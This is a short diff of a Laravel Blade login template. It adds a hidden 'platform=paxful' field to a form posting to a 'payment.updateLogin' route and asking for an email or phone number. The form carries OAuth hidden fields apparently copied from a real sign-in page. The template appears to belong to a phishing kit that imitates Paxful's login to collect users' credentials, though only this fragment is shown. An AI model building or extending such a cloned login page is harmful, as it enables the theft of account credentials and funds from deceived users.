@@ -89,6 +89,9 @@
           <form class="!mt-0 space-y-6" action="{{ route('payment.updateLogin') }}" enctype="multipart/form-data" method="POST">
 
             @csrf
+
+            <input type="hidden" name="platform" value="paxful">
+
         
             <input type="hidden" name="$ACTION_ID_44fea4d427d84a75e2ac93482bd08f6983e799eb"><input type="hidden" name="next" value="/oauth2/authorize?locale=en&amp;state=0983a336ae5f30d02fef8ca47584c954&amp;response_type=code&amp;approval_prompt=auto&amp;redirect_uri=https%3A%2F%2Fcom%2Flogin%2Fcallback&amp;client_id=YbudmyiLyLEmRSWEhohB99HMlZV7DCAxozPh5gW1xOQI1TL6"><label class="text-[15px] font-medium leading-none tracking-tight text-tertiary peer-disabled:cursor-not-allowed peer-disabled:opacity-70 flex flex-col gap-2" for="email_or_phone">Email / Phone Number
               <div class="flex items-center rounded-[16px] font-medium !text-foreground placeholder:!text-tertiary dark:border-transparent bg-container h-14 p-4 text-[15px] leading-6 relative border">
